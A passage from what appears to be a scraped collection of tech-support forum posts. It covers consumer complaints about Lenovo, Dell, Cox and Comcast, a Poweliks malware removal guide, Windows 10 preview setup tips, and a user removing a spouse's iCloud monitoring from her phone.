&gt;So here is the long story. The Verizon Note 4 is bootloader locked with no known exploit. It has several security systems in place to make sure you (the owner) don't get to do anything with the phone that Samsung and VZW dont approve of, UNLESS you buy the Verizon Note 4 'Developer Edition'. The reason that this matters to you, is that there is no way currently to access a full bit-for-bit copy of the internal storage.

&gt;Our resident Android Guru has been working on this solid since we got your phone (partly because of the almost $15000 reward for it), but is up against a wall as well.
&gt;
&gt;In effect, you are out of luck on recovering the video until an exploit is found for this phone (which it may or may not ever be). Your options are to keep the phone safe and unused somewhere until the phones security is broken, or to move on.
&gt;
&gt;I wish we had better news, and I wish that Android phone manufacturers would keep these open source phones open, and not locked like Fort Knox (https://en.wikipedia.org/wiki/Samsung_Knox).

&gt;Please get me your shipping address and we will overnight the phone back to you. I am sorry, and I know this is not what you were hoping for, us either!

They also included a spreadsheet breaking down the bounty for unlocking the phone.  Either way, this is good information for this sub, I'd assume, and bad for the people with the pictchforks and such.  My attorney is still moving forward, and that is going to be a long process, so if your ""RemindMe"" shit doesn't have ""months"" somewhere in it, you can forget that.

Seriously, the internet is awesome when you look at it from the standpoint of I cane to this sub to get a result and I got one (good or bad).  It sucks when apparently I became a ""Karma Whore"" somewhere in here.  You all can think what you want, but seriously, how does this matter to your life?  Stop being so cynical.  In the words of [Conan O'Brien.](http://youtu.be/AcF1OoWqXBc?t=3m47s)

EDIT 18 (Feb 16):  Some of y'all need to get a life.  I'm not some cop-bashing anti-anything attention seeker.  I came here for a tech support issue and got exactly that.  If the result isn't what you had hoped for, too goddamned bad, go upstairs and cry to your mom.  The people who help out in here are awesome, and shouldn't have to deal with some of you terrible, terrible human beings who for whatever reason think that the reading and commenting on a story makes them somehow entitled to anything. Nobody owes you shit, get used to it.  

Final Outcome (November):  The company from Oklahoma tried to get the video out of the phone for no charge and could not get it. I knew that the hospital had cameras and I tried to get a lawyer where I am to take the case on a contingency fee basis which was unsuccessful. Not an exciting conclusion to the story, but it is what it is.  Thank you all, I hope you all have a happy holiday season.

Super Three-Year-Later Edit: This pissed me off so much, I went to law school and became an attorney and now do defense work in Texas.

2u5s41,"Are we still publicly shaming companies with bad customer service? Because Lenovo won't fix, return, or replace my laptop and will only refund me half of what I paid","Don't know if this is the right place to post this... but here's a horror story for people considering Lenovo.  After three unsuccessful warranty repair attempts for an acknowledged factory defect in their display, **Lenovo disposed of my laptop, won't replace it, and will only refund me half of what I paid for it.** 

Get a quick overview in this [imgur album](http://imgur.com/gallery/UJfkx) or read on for a lengthy timeline of the whole saga.  With pictures!

**April 30th, 2014** – I bought a sweet new refurbished[ Lenovo Thinkpad Laptop](http://i.imgur.com/xPnNqGE.jpg) through Amazon.  I love Thinkpads and have been using them since before they were Lenovo.  Hurray!

It was sold through an Amazon marketplace third party but despite being refurbished, it specifically says it has a full factory warranty.

**July 23rd, 2014** – My laptop starts having ghosting/image retention issues.  It is a very common issue on the [forums](http://forums.lenovo.com/t5/ThinkPad-Edge-S-series/Thinkpad-Yoga-ghosting-after-image-watermark-issue/td-p/1412737).   Lenovo has no official solution and mine is still tolerable during every day use, so I wait.

**November 4th, 2014** – Lenovo officially [acknowledges that there is a defect in their hardware.](http://i.imgur.com/cv6iznl.jpg)  Some users have been reporting that the replacement panel also shows symptoms of ghosting, but Lenovo denies it.

**November 24th, 2014** – My display has [deteriorated quite a bit](http://i.imgur.com/ncaIKCe.jpg) so I call Lenovo tech support.  They are very friendly and overnight me a box to ship my laptop in to the service depot for a screen replacement.

**December 2nd, 2014** – I receive my laptop back.  They have replaced the display with the updated panel.  A quick test shows very mild image retention still, but it is much improved.  However, now there are [two dead areas in the touch screen](http://i.imgur.com/BzctX5Q.jpg) that don't respond.  One of them is right over the start button.  Several other people [have this issue in the forums.](http://forums.lenovo.com/t5/ThinkPad-Edge-S-series/ThinkPad-Yoga-touchscreen-dead-spots-on-lower-corners/m-p/1728329)

**December 3rd, 2014** – Called back tech support.  They are not quite as together this time but ship me another box to send my laptop in again.   I send it in December 9th.

This time they hold onto it for a week. The status says “Hold for customer information” instead of “Repairing” but support assures me that's just a placeholder and that they don't need more information from me.

**December 17th, 2014** – I get an email saying the repair was complete and the laptop was shipped back to me.  UPS tracking shows the laptop was delivered to North Carolina somewhere.  I live in California.

Here's what the nice lady on support chat said:

&gt; **Tiffany**  
&gt; Per David O****** sending machine to lenovo for investigation. SBU  
&gt; You should recieve a call for a posible replacement.
&gt; 
&gt; **Me**  
&gt; do you have a number I should call?
&gt; 
&gt; **Tiffany**  
&gt; They will contact you.  
&gt; Is there anything else I can help you with?
&gt; 
&gt; **Me**  
&gt; Will they contact me today do you think?
&gt; 
&gt; **Tiffany**  
&gt; maybe not today unsure.  
&gt; Is there anything else I can help you with?
&gt; 
&gt; **Me**  
&gt; So there's no ETA on when the laptop will be repaired or replaced at all?
&gt;
&gt; **Tiffany Snadon**  
&gt; NO  
&gt; You will be contacted the just recieved the machine it's a process.  
&gt; Is there anything else I can help you with?
&gt; 
&gt; **Me**  
&gt; Okay  
&gt; That's all, thanks 

**December 19th, 2014** - Still haven't heard anything.  I call Lenovo customer service.  Same number I've always used.  The guy says that he doesn't do Thinkpad support, but he'll transfer me.  He transfers me, I wait on hold, another man answers.  He says he's in Ideapad support and doesn't do Thinkpad support.  I tell him I was just transferred here BECAUSE he did Thinkpad support.  He's like nope, let me transfer you back to Thinkpad support.  He hangs up instead of transferring me.

I call Thinkpad support again.  The lady on the phone is baffled and calls the support depot for me.  We wait on hold for about 30 minutes, finally the support depot answers.  The customer support lady hung up at some point during the wait and is no longer on the line.  Whatever.  The support depot says  ""yeah we sent it off to engineering, someone should have contacted you.""  I was like ""no one contacted me.""  they were like ""huh!"" then they gave me the number of the guy they sent it to.  I call, but no one answers.  I call back the support depot, wait on hold for 20 more minutes, then explain the situation again.  They use phrases like “this is so weird” and “I've never seen this before!”  She calls Lenovo HQ for me, and eventually comes back and says that the guy who has my laptop is one of their top engineers but he's out of the office for the day already.  It is...  1:16pm.  They have no idea what he's doing with it or when I will get it back.

Right after I hang up, amusingly, FedEx knocks on my door and delivers my laptop back to me.  I open it up.  It is exactly the same, same screen ghosting, same dead spots in the touch screen, and also now the [covers that hide the screws are missing.](http://i.imgur.com/sUBsOkR.jpg)

I call back Technical support, explain the whole situation.  Since they have tried twice to repair and only made things worse, I ask for a replacement laptop or for a repair tech to come to my location instead of sending it to their depot (a service they offer for more expensive warranties.)  They refuse.  The lady says she will escalate this to their “top techs” this time.  I explain that it was already sent to their “top engineer” at Lenovo HQ and still wasn't fixed.  She says she can't do anything except put a note on it for the service depot to escalate it.  I ask why that didn't already happen after they didn't fix it the first time.  She says she's positive they will fix it this time if it is escalated.  I ask what happens if they don't, she says then they would discuss a replacement but she's positive it won't come to that.

**December 23rd, 2014** – They've had my laptop a few days, the status is back at “Hold for customer information.”  I'm also not getting email confirmations this time for some reason.  I call the service depot, wait on hold, and finally ask if they need any more information from me.  They say no.  I ask why I'm not getting emails.  She says that no email address is listed for me, even though they had my email the last two times.  I ask her to add one, she says she can't modify service requests, only view them.  Great.

At some point after the first failed repair I filled out one of those [“How are we doing” automated surveys](http://i.imgur.com/u2sETmT.jpg) regarding their customer support, and later that afternoon, a Customer Satisfaction Advocate emails me.  I reply within 20 minutes explaining the whole situation.  She [replies](http://i.imgur.com/SNykhU4.jpg) immediately:

&gt; I am out of the office until 12/24/2014.
 
&gt; I will respond to your message when I return.

She never responded.  Hilarious.

**December 29th, 2014** – I receive a call from a new guy in escalations asking me to call him.  I call him back twice, no answer.

**December 30th, 2014** – I call him back again.  He asks why I called.  I said...  he left me a message asking me to, and I was just checking on the status of my laptop.  He says he doesn't know but he will contact the service depot.

**January 2nd, 2015** – Haven't heard anything.  Call back escalation guy.  The second time I call, he answers, says he hasn't heard anything, but he will email the service depot manager.

**January 5th, 2015** – Haven't heard anything.  Call back the escalation guy.  He says they can't fix my laptop, but someone should contact me about a replacement.

**January 12th, 2015** – Haven't heard anything.  Get a call from escalations guy.  He asks if I'd been trying to call him, because they changed his number.  He says the service depot has said they can't repair my laptop but they haven't officially marked that down on the service request yet.  Lenovo can't proceed with a replacement until they officially say they cannot repair it.  He says he will email them again.

**January 13th, 2015** – I miss a call from a new Customer Advocacy Case Manager in the morning.  I call her back and she doesn't answer. Over the next few days, I call several more times.

**January 15th, 2015** – Finally get a hold of her.  She says because my laptop was purchased through a third party vendor, they can't replace it, but they can refund me what I paid for it.  She has to request a refund, confirm the amount, and then money is coming from China so it will take a couple weeks.  I tell her they've had my laptop for months and ask if there are any other options, she says no.  This is the first I'm hearing about the ""can't replace laptops sold through third parties"" rule.  She says she just needs me to ship my laptop back to them to get the process started.  I tell her that it is... still in the their repair center.  Where it's been for months.  She's like “oh good that will speed things up!”

**January 16th, 2015** – I [emailed the customer advocate lady back](http://i.imgur.com/uzolegt.jpg) (she specifically told me to email her since she was too busy with customers to answer the phone.)  I explained I had been thinking about her refund offer and decided I thought it was unfair.  Even if I got my full purchase price back, because I got a deal on it originally, it wouldn't be enough money to replace it with the exact same model without spending additional money out of pocket.  I requested a replacement of my exact same laptop, if not the newer version that was just announced that would presumably fix this hardware issues.  If that wasn't possible, at least a discount on a new laptop that would bring it down to the $1400 I paid originally, especially considering the length of time this had taken and the fact that it was a known hardware issue in the first place exacerbated by the service department.

She never replied.  She also never contacted me to confirm anything.

**January 27th, 2015** – I receive a check from Lenovo for $864.06.  I originally paid $1399.99 for my laptop.  I call back the customer advocate, she doesn't answer.  I call the escalation guy at the depot, he tells me to send him my original receipt and he will forward it along.

**January 28th, 2015** – The customer advocate rep calls me back.  I recorded it, but in summary she says that they only refund the amount that Lenovo was paid for the laptop, not the amount I paid, and they won't replace the machine because it was refurbished.  Literally she claims if I bought a Lenovo laptop at Best Buy that they couldn't repair they would only refund me what Best Buy paid for it.  

I say I never would have accepted a refund had I known it would be for half of what I paid for it.  She maintains my only option is to go back to the original vendor.  I tell her fine, send me back the laptop so I can return it to Amazon.  She says she will email the service depot to see if they even still have it.

I ask for a discount on a new one, she offers me a 15% discount.  That would make a new laptop of the exact same model cost roughly $1500, which is more than the $1400 I paid originally and much more than the only $860 I have now.

She tells an unrelated story about a lady in Afghanistan who bought a Lenovo laptop off eBay and received one that had been opened and parts swapped out.  She claims in my case that they can't prove that Lenovo caused the issue, because maybe my seller modified the laptop before I got it.  I say that's ridiculous because it's a known hardware issue in this model and also the *service depot* caused the second issue.  She says she is ""baffled"" that I never got an email about the refund price.

She claims the seller lied about it coming with a new factory warranty, even though their own refurb factory outlet specifically says all computers come with a full factory warranty.  She promises to send me the warranty information but never does.

She refuses to believe the service depot made the issue worse after the first repair. Exact quote: ""They're in the service of fixing your computer, why would they break something?""

Anyway.  I continued our communication with emails, to get things in writing. 

You can read the whole [email chain here](http://i.imgur.com/g6IfBRW.jpg), but some select quotes:

&gt; **Me**  
&gt; Are you saying if I bought a Lenovo laptop from Best Buy, and it had a hardware defect that couldn't be repaired by the service depot, Lenovo wouldn't replace the machine and would only refund the amount Best Buy originally paid Lenovo for the laptop?

&gt; **Lenovo**  
&gt;We would only refund you the price Best Buy purchased our machine from us

and

&gt; **Me**  
&gt;Can you show me these policies somewhere?  Because as I said in my first email the outlet website specifically states the laptops come with a standard warranty and... Doesn't make any mention of only replacing refurbished with refurbished or similar.

&gt; **Lenovo**  
&gt; These are internal policies.

Anyway, of course the service depot had already scrapped my laptop, so they can't return it, and won't pay me more than $860 for a refund that I never agreed to in the first place.

Her final email:

&gt; As already stated, we will not be giving you any further compensation for your machine that was purchased from a third party vendor.   Buyer beware.


TL;DR Buyer beware indeed.

2u0d3u,My brother's PC seems too slow for its hardware.,"Hello,

My parents bought my brother a PC back in 2013 (if memory serves...). I got a laptop at around the same time. Since then I've seen his computer have trouble running a number of games that I would expect it to handle. Sometimes even underperforming my laptop. I'm not knowledgeable enough about PCs to know what is going on and I was hoping someone here could help. My brother has autism and has been getting into playing on the PC. It breaks my heart that he should be able to enjoy much better graphics than me, but instead he literally can't play certain games because of the lag involved.

I got [these specs](http://pastebin.com/HKx2xWmf) for his computer from 'Can I run it'. Most recently I saw his computer have horrible frame rates while trying to play Dying light on its lowest setting. Even though 'Can I run it' implies he should be able to, and my laptop can handle it better.

So can anyone help me out here? Is there anything that needs replacing, updating or fixing?

2twy6d,"PSA: Seeing a -LOT- of Poweliks infections. Here's a simple guide to check for it, and remove it.","**READ THIS FIRST:**
&amp;nbsp;


*Poweliks is often accompanied by a variant of the ransomware CryptoWall or CryptoLocker. These ransomewares are often triggered to launch once Poweliks has been removed. It is HIGHLY important that you run a threat scan with an up-to-date copy of [Malwarebytes Anti-Malware](http://www.malwarebytes.org/mwb-download/var3/) and quarantine anything it finds BEFORE continuing on. This should remove the ransomware if it is present.*

  ===============================================================

**TUTORIAL:**
&amp;nbsp;

Poweliks has been 
running rampant lately. Here's how to fix it if you get an infection. [Here's some info](http://blog.trendmicro.com/trendlabs-security-intelligence/poweliks-malware-hides-in-windows-registry/) on the infection. It's very interesting how it operates in the Windows registry.

&amp;nbsp;


**Most common sign of infection:**

[Powershell has stopped working.](http://www.dev-one.com/wp-content/uploads/2014/03/powershell-has-stopped-working1.png) You will likely see this error pop up randomly on your machine. The speed of your machine is also likely very sluggish. You may also see a ton of dllhost.exe processes running in task manager.


&amp;nbsp;

**How to remove (or check for) the infection:**

If you see the above Powershell error, simply run [ESET's Poweliks Cleaner](http://www.eset.com/int/download/utilities/detail/family/252/) for your OS and it will do the work for you. You can also use [Malwarebytes Anti-Rootkit](http://www.malwarebytes.org/antirootkit/). Both are excellent, free utilities.

ESET's Poweliks Cleaner [will look like this](http://i.imgur.com/fRD2Fkz.png) if the infection is found. Simply press 'y' and reboot to remove the infection.

&amp;nbsp;

After the tool has removed the infection, run the following programs in this order to remove any left over threats that might still be present:

&amp;nbsp;

1) Threat scan with an updated version of [Malwarebytes](http://www.malwarebytes.org/mwb-download/var3/)

2) [ADWCleaner](https://toolslib.net/downloads/viewdownload/1-adwcleaner/) and 'Clean' everything it finds.

3) [Junkware Removal Tool](http://www.bleepingcomputer.com/download/junkware-removal-tool/) followed by a reboot.

2ssv6y,Colleague who types with elbows - he lost his forearms in Iraq and types lying down on his bed where he is confined - wants to buy a laptop without numpad,"Colleague who types with elbows - he lost his forearms in Iraq and types lying down on his bed where he is confined - wants to buy a laptop without numpad. This way the keyboard is not cluttered and he can type better. But he cannot find one. He needs a screensize of at least 15.6 inches. These days it seems they don't make laptops without number pads. If you can locate one online, please share the link.





*EDIT: Thanks for all replies. I have passed most of them on and will pass on the rest this evening. My friend has a clarification and two questions. Sometimes he can sit up on his bed, so he wants a normal laptop that will make him feel more normal. He also hopes to get off his bed in the future and be mobile. He hopes to walk and run and take the bus like a normal person and also later complete his degree in Biology. So he wants a normal laptop but not something expensive. The two questions he has – Can he buy those Macbooks that have no numpad, then completely erase the Apple OS that comes on those macs and load his favorite Bio-Linux system on it? He likes Bio-Linux because that linux distro comes equipped with his favorite software. The next question is – Can he buy the Chromebook which also does not have a numpad, erase Google's operating system and load Bio-Linux on a chromebook?*

2qhhh9,"My Google Drive Account was suspended, I've lost years of work, I need advice.","A week ago I was sitting at my desk when I received a notification that because of unspecified violations of the terms and conditions of Google Drive, my account has been suspended.

I am a student and I have been saving all of my notes and work to google drive for years.  While I have backups of everything saved to my computer, much of that work was saved in the form of google docs and downloaded as a backup in the format of "".gdoc"".  I'm talking most of my research here.  The unfortunate thing about this is that I can't open those files without google drive.  I created a new google drive account, and uploaded the .gdoc files, but I still cannot open them.  It would seem that they're only able to be opened on the very google drive account that was suspended.

The night I received the email notifying me of my suspension, I called Google Support.  They advised me that I should appeal the decision and directed me on how to do this.  I submitted the appeal.  It has been a week and I have heard nothing.  I called Google Support again today and was told that they have no means of directly communicating with the team that makes decisions about revoking account access, but they can send them a message about my situation.  I asked them to explain my situation about the .gdoc files and to request that they would at least send me these files in the form of word docs.  They also advised me to submit another appeal, which I did.  It reads as follows:

""My google drive account has been suspended and the Google Support team advised me to appeal again. I have so much trust in your product that for the last couple of years I took notes exclusively through Google Docs, saved to the Google Drive account you have suspended. Because these were largely saved in "".gdoc"" format, the 
backup I had of these documents are all useless- they can only be opened in google drive, and only in the specific google drive account that you blocked me from. I absolutely require a means of getting a MS Word copy of all of my.gdoc files, otherwise I will have lost 
years of research and hard work that I've done. Of course I'd like to have full access to my account again and I would do anything to get that back. Please call or write me so we can discuss this further, I would like not to have to keep badgering Google with my requests. 
It's ironic that to show me how much I need to respect intellectual property rights, Google has taken away my intellectual property.""

2qdayu,"It's getting hot in here, so check on all your cores","*I am, getting so hot, I wanna ~~take my clothes off~~ heat my cores up.*

So my machine, which I built back in 2011, is heating up. I have core temp loaded up and at ""idle"", it's anywhere from 37-47C. Which is fine, that's what I expect it to sort of be at, although 47C is a bit high for usual idle temps for this guy. When I'm browsing chrome, if I just have a couple of tabs up it usually cools down to 41C-45C, but can increase to as much as 60C to sometimes 70C if I have too many windows open, especially if it's youtube videos.

The worst is when I'm gaming (which is what this machine was built for), the temps go up way beyond 86C, sometimes reaching 97C. I'll know because I'll either exit the game or alt-tab and see warnings from ASUS AI Suite that the core temp has shot up above 86 and core temp will be reporting these temps.

Here are some things I think I can do to fix it, and I want to check with you guys whether there's anything else I need to do.

I checked the outsides and insides of the computer and there's a lot of dust near the vents and ports. I have cleaned out all of the dust-catching screens (washed them, dried them and put them back), and did some initial dusting inside with a microfiber cloth.

There is a little bit of dust caked into the fans, and inside the components themselves, and I'm thinking of just removing each component and cleaning each one with a cotton swab and a compressed air can.

On top of that, I have a small dispenser of arctic silver thermal compound. I had the feeling that I would need to remove the heatsink and redo the compound, but am a bit wary of cleaning out the CPU and reapplying it without damaging the CPU or other surrounding components. I'm not sure if it's needed, the computer was built in April 2011... and I'm not sure how long the compound should ideally last.

The computer also sits on carpet right now, and I'm thinking about raising it slightly off the ground so that it doesn't become like a vacuum for dust and stuff (there is a vent on the bottom of the comp, next to the power supply).

What other things should I be doing to help cool this mother down? What's the best way to remove the old thermal paste and apply new paste? Should I be applying thermal in the first place?

Thanks for your help.

UPDATE TL;DR: Took apart my computer, cleaned the shit out of it, put on new thermal paste. It posted! Idle is mid-high 20s, and using chrome is about high 20s to low 30s. Will give it a test when gaming.

Here are some pictures: http://imgur.com/a/585Xj

UPDATE 2 (Gaming): Played mass effect as I did before I cleaned the comp. Temps are now not going over 45C. THIS IS WONDERFUL WOO.

UPDATE (more details): So I cleaned out the computer (almost) entirely. I took apart the tower, took out the video card, took out the heatsink and fan, even the ram sticks (mostly just to give me room), and started cleaning everything. Took all the components outside to the ventilation and started blasting them with compressed air cans (which I had a ton of). There was tons of dust caked into the vidja card, the fans, the mobo, so much more than what I expected for 1 month. I sat outside and just cleaned away everything, right down to using microfiber cloths on the fins of the fans and isopropyl alcohol + cotton swabs on the non-electronic components. I managed to get the heatsink off of the unit with some difficulty. Had to push in the pins on the back of the mobo as I couldn't access one of the screws since the fan was attached to the heatsink pretty well. Once I got that off, I was able to clean up all the dust, and cleaned off the base with isopropyl alcohol to remove the thermal compound. One of the main issues with the cooler was that the thermal compound was already prespread across the whole base, so when it was placed onto the CPU, some of it had gone off to the sides of the CPU. Thankfully, none of it got onto anything important, but it was still annoying to clean. I cleaned off the CPU with isopropyl (btw, I was using 91%, as walgreens only had that... was looking for 99% so that it would evaporate stupidly faster). I used cotton swabs for the sides of the CPU to get rid of the extra thermal paste and used coffee filters on the top. The paste was definitely harder to get off of the heatsink than the CPU. I think the copper of the heatsink might have something to do with it. Anyways, once I did that, I pulled the fan off the heatsink and sprayed the crap out of it and cleaned up all the fins. I let everything dry for a few hours, and then put it all back together. I applied about a pea size/rice grain size amount of thermal compound on the CPU and on the heatsink. I spread it very gently, and hopefully it surrounded the surface properly.  Seated everything properly, put in all the pins, screws, mini dildos etc that hold everything together, and put it all back. Plugged all the cords, and it posted. So far so good. The heat is reading as 30-33 on core temp at both idle and while using chrome. My mobo's software is reporting 22C for the CPU for both cases. Not sure which one to go with but that sure is hell of a lot cooler than before at 45C.

2izfju,Cox turned off my internet access because someone else didn't pay their cable TV bill… I'm on day 3 now.,"(This might be the wrong subreddit, if so I'd appreciate direction to a better suited subreddit)
Two nights ago I got home to my cable modem's ""receive"" light blinking oddly, never seen that before. I tried restarting the modem with no luck. I ended up calling Cox Communication's tech support line and did all their steps and they suggested I was experiencing an outage, and then scheduled a tech to come out… 5 days later to try to fix it. Shit, but fine.

The next morning I find out everyone in my condo complex doesn't have any cox cable service anymore. 
I talk to one person who says they got in contact with the local office and who told her they turned off the whole building ""to get someone's attention about late fees owed to the tune for $350+ dollars"". 
I said ""Weird, what does that have to do with me, I just started the service two months ago and my bill is currently paid."" Never the less, we were told we should come to their local office to resolve the issue.  Great… later in the day I take my lunch break to head down there where the (local manager?) apologizes and tells me my service is back up, cancels the scheduled tech call. I finish out the work day, head home… modem still is blinking ominously.

I restart it just to be sure. 
...Nothing.

I goto my neighbor, their service is still out too.

Ok, shit. 
I call the local office, they are closed for the weekend. Next I sit on the line with tech support for 2 hours and they don't know anything about what happened and were unable to turn service back on. They ultimately schedule someone to come out next Tuesday…

So here I am today, sitting at work, fuming, because cox turned off my service due to someone else not paying their basic cable TV bill.

Has anyone else had experience with this kind of ridiculous situation, is my only option to just sit here on my thumbs until they finally get out here to turn it back on? Is there anything I can do to turn the service back on? The whole situation seems unethical.

Windows 10 Technical Preview was released a few hours ago to members of the Windows Insider Program.  This is Microsoft's ""latest and greatest"" operating system, but is still very much in the development stages.

You should not use this as your main operating system and should not use this unless you have a good understanding of computers.

This thread is for help setting up and running Windows 10 Technical Preview.

**Common errors**

You receive error code 0x5D when trying to install  
Solution: This has been largely attributed to people using Windows Other instead of Windows 8 or 8.1 as the target guest OS in virtualization software.

Generally, you need to make sure any virtualization technology is turned on (both in your BIOS and VM settings)

Your install hangs during account creation, or you never receive an activation code from Microsoft.  
Follow the local account creation below  
If that does not work, disconnect from the internet and attempt again (it should automatically forward you to local account creation)

---

**If you do not want to use a Windows Live account as your login info**

Disconnect from the internet before entering the second stage of the setup

OR

When prompted for your Windows Live credentials, perform the following steps:  
Click ""Create a new account""  
Click ""Sign in without a Microsoft account""  
Create your local profile  
This applies for Windows 8 and 8.1 setups as well.

---

**If you want to dual boot your current OS(es) and Windows 10**

You will have to use [EasyBCD](https://neosmart.net/EasyBCD/) or other like program  
NOTE: Windows 10 will wipe out your existing bootloader.  You will be unable to boot into any other operating system on your drives until this bootloader has been patched up.

**Installing Windows 10 directly to a VHD (no third party bootloader editor, no partitioning)**


Thanks to /u/infinifunny

1. Create a bootable USB containing the Windows 10 installer (in addition to WUDT, linked above, [Rufus](http://rufus.akeo.ie/) works).

2. Disk Management -&gt; Action -&gt; Create VHD... Configure based on your needs, though the size should be more than 16GB.

3. Reboot and boot into the W10 installer

4. At the ""Install Windows"" screen, press Shift + F10 to open command prompt

5. diskpart &lt;enter&gt; select vdisk file = PATH_TO_VHD &lt;enter&gt; attach vdisk &lt;enter&gt; exit

6. Install to the new virtual disk (use the custom install option)

7. To remove, delete the VHD and remove the entry from the boot tab in *msconfig*

2gh63k,"How Do I Remove My Husband's email from my iCloud, and my phone from his? (he's monitoring me)","**THANKS EVERYONE- I'm going though all the processes below, I've wiped my phone, dumped my old cloud, new emails/passwords and all the good stuff.  Thanks again!**


Long time reddit user. New account, obviously.

**Tl;dr**- how do I un-link icloud from another person’s email? Can I access just contacts to upload to new phone and nothing else? Can I remove the old phone back up from iTunes to not upload to new?

Keeping details vague, I have left an unsafe marriage. He had been monitoring my communication for some time. He signed up my phone for the cloud (""in case it was stolen"") but I deleted the account and shut off the cloud on my device. I did not originally create an icloud account, he created it without my knowledge, and I found out by mistake. As I am aware of via the police, there may be tracking apps or something of the like, hidden in my phone or linked as well- possibly similar to what parents use on teens. I don’t understand it entirely.

Due to various warranty issues, Apple advised me to back up before giving me a new phone. I could not create an icloud account as it was already recreated with my email. I presumed I didn't delete it properly. Restoring my phone, there were multiple choices to back up including his old emails from many years ago. I was not aware he was linked at all after I deleted the account, or that he was linked previously. I had no idea the extent of the issues. Apple informed me that those are the addresses connected to my account. As I understand it, some users have multiples for work and personal use, etc., also linking calendars and family for responsible use of the cloud. Share share share connect connect connect

As part of the restore, I could click on any of the emails and it would list the back up options from each of those. I'm appalled and nervous to find back ups or access of my phone that I was unaware of for an email that was not mine. This includes find my phone, location services, book marks of the map app, all kinds of scary stuff. 

I have a new phone, new plan, clean slate. 

It would be nice to upload my contacts and a few other things to save the hassle, though I have no problem starting from scratch. However, when I sign into the cloud via desktop on net, I cannot find these email address, cannot figure out how to unlink, etc. Is this controlled under his email or is there a tab I’m not sure of? I don't want to forever have this magic invisible cloud hanging over my head as I tried to delete it previously and have no idea if that will work again. Also, if I connect to iTunes, I don't want the old back up on my new phone.  Is there a way to remove it from there?

Thanks, and I apologize about the length...

2ge4c7,"My Dell Alienware computer CAUGHT ON FIRE, Dell told me the cause was ""Wear and Tear""","The following email was received by Suneel Prasad on 21/08/2014:

 ""Dear Jacob,

 We did receive word back today from Dell regulatory concerning this system.

 I regret to inform you that this is not a potential safety incident. There is a component that is failing when the system is powered by battery. This is due to normal wear and tear and is not considered to be a potential safety issue.

 We are shipping the system back to you since the warranty on the system does not encourage any repairs unless you pay for the repairs to complete. I will update you once the tracking details are available.

 Regards,

Suneel Prasad

Dell | Executive Customer Support Team""

 
   This was the email I had received by the Dell representative Suneel Prasad in an attempt to close the complaint I had opened months ago about my Dell Alienware laptop catching fire.  Only 3 months prior to my Dell laptop catching fire, there had been issues with the computer straight out of the factory.  Dell had my laptop returned to them and fixed the issues, deeming it safe for use.
  After my laptop had spewed fire out of then back, leaving scorch marks on my desk, I contacted Dell and they simply told me ""If you are out of warranty then we unfortunately cannot do anything for you Sir"", with absolutely no concern for the fire.  I contacted the Better Business Bureau to assist with my case, and so they did.  
  After the Executive Dell Support team from Austin, Texas had been contacted it took months for the case to go anywhere.  This is mainly because Dell had lied to the BBB and myself, saying that they had already had an examination team examining my laptop and that they had found nothing of harm.  At this point, I had not sent Dell my laptop yet (I have this email documented from Dell).
   After I had caught them in their lie, Dell immediately sent me a box to return the laptop to them for actual examination.
   A month after sending them the laptop, Dell responded to me with the email stating that no component they had found was of any harm, and the incident was caused by normal ""wear and tear"".
  Regardless of what component has failed, and regardless of why it has failed, fire and smoke have came out of the back of the computer.  The inner components of the computer wouldn't be scorched and melted unless they were heated to a temperature where fire was produced.  There is very clear evidence showed in the pictures I had taken of the laptops inner components.  It has become a regular occurrence for Dell to now tell me that my case is harmless.  I realize now that Dell deems fire coming out of the back of their computers as long as it was produced from ""wear and tear"" as a non-safety hazard.  From how this has been handled so far, one could think that ""wear and tear"" is expected to cause a Dell system to set fire, and that there is no surprise to my case.  Regardless of whether or not Dell thinks the situation was harmless, it very well was not harmless, as documented by the local PC repair shop I had taken the system to (I also have a picture of their formal report from the laptops attempted repairs).  It is clear to me that Dell's support team would rather every other option then customer satisfaction and product safety.  
    If I was not standing next to the computer when it caught fire to unplug it from the wall to disconnect power, it could have potentially burned my house down.

Not only do I have a video that shows what happens when I plug the battery into the computer, but I also have pictures of the scorched components and of the formal document given to me from the local PC repair shop.


***EDIT MUST READ***: Earlier today after I emailed the Dell CEO I received a call from Suneel Prasad.  He told me their stance remains the same, and that the situation has already been escalated to its fullest.  I don't think they like all this bad publicity, what do you guys think?  Lets keep pushing the right buttons and see what kind of reaction we can get out of them next.


SO, can you guys help me get some publicity?

##Grab the latest version at:  https://www.reddit.com/r/TronScript 


----------------------------------------


**Background** 

Tron is a script that ""fights for the User""; basically automates a bunch of scanning/disinfection/cleanup tools on a Windows system. I got tired of running these utilities manually when doing cleanup jobs on individual client machines, and decided to just script the whole thing. I hope this helps other techs and admins.

----------------------------------------

**Stages** of Tron:

0. **Prep**: `rkill`, `WMI repair`, `clean System Restore points`

1. **Tempclean**: `CCLeaner`, `BleachBit`, `clear event logs`

2. **Disinfect**: `Emsisoft Commandline Scanner`, `Vipre Rescue Scanner`, `Sophos Virus Removal Tool`, `Malwarebytes Anti-Malware`, `sfc /scannow`

3. **De-bloat**: removes a variety of OEM bloatware; customizable list is in `\resources\stage_3_de-bloat\programs_to_target.txt`

4. **Patch**: Updates 7-Zip, Java, and Adobe Flash/Reader and disables nag/update screens (uses some of our [PDQ packs](http://www.reddit.com/r/sysadmin/comments/27sr63/pdq_deploy_packages_v180/)); then installs all available Windows updates

5. **Optimize**: `chkdsk` (if necessary), Defrag `%SystemDrive%` (usually C:); skipped if the drive is an SSD

6. **Manual stuff**: Contains some extra tools you can run manually if necessary (`ComboFix`, `AdwCleaner`, `aswMBR`, `autoruns`,  etc.)

Saves a log to `C:\Logs\tron.log`.

2d1r6n,Comcast told me to call The Weather Channel to see when my internet would be back.,"I'll keep this pretty short because I'm still livid. 

I called Comcast today to get a tech out to fix my internet that goes down every time it rains, even in a light drizzle. I've had one teach already and it wasn't fixed then, but he agreed what the problem was. Water in the lines. He replaced two sections, but the problem persists.

Now, today was a particularly powerful storm, so I don't blame them that they didn't want to do anything because of other widespread outages in the area due to weather. Fair enough. So they gave me a number to call to see when the outage was planned to be fixed. The number they gave me was for the Weather Channel. COMCAST TOLD ME TO CALL THE WEATHER CHANNEL TO SEE WHEN MY INTERNET WOULD BE BACK.

I guess the question, has anyone had success in getting them to fix the actual problem? Is there someone specific that I should talk to, and how should I explain that there is short in their cable somewhere?

